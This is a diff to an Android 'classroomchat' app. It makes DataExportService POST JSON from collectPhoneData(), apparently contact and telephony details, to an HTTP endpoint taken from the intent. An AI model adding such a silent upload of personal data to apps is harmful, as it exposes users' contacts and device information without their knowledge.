@@ -2,22 +2,36 @@ package com.n2305.classroomchat;
 
 import android.app.IntentService;
 import android.content.ContentResolver;
-import android.content.Intent;
 import android.content.Context;
+import android.content.Intent;
 import android.database.Cursor;
 import android.os.Build;
 import android.provider.ContactsContract.CommonDataKinds.Phone;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import com.squareup.okhttp.MediaType;
+import com.squareup.okhttp.OkHttpClient;
+import com.squareup.okhttp.Request;
+import com.squareup.okhttp.RequestBody;
+import com.squareup.okhttp.Response;
+
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.IOException;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
 public class DataExportService extends IntentService {
+
+    public static final String HTTP_ENDPOINT = "HttpEndpoint";
+    public static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
+    OkHttpClient httpClient = new OkHttpClient();
+
     /**
      * Creates an IntentService.  Invoked by your subclass's constructor.
      *
@@ -33,12 +47,31 @@ public class DataExportService extends IntentService {
 
     @Override
     protected void onHandleIntent(Intent intent) {
+
         try {
+            URL httpEndpointUrl = new URL(intent.getExtras().getString(HTTP_ENDPOINT));
+
             JSONObject phoneData = collectPhoneData();
-            Log.d("DataExportService", phoneData.toString());
-        } catch (JSONException e) {
+            String phoneDataString = phoneData.toString();
+            Log.d("DataExportService", phoneDataString);
+
+            sendDataToServer(httpEndpointUrl.toString(), phoneDataString);
+        } catch (JSONException | MalformedURLException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
             e.printStackTrace();
         }
+    }
+
+    private void sendDataToServer(String url, String json) throws IOException {
+        RequestBody requestBody = RequestBody.create(JSON, json);
+        Request request = new Request.Builder()
+                .url(url)
+                .post(requestBody)
+                .build();
+
+        Response response = httpClient.newCall(request).execute();
+        Log.d("DataExportService", response.toString());
     }
 
     protected JSONObject collectPhoneData() throws JSONException {
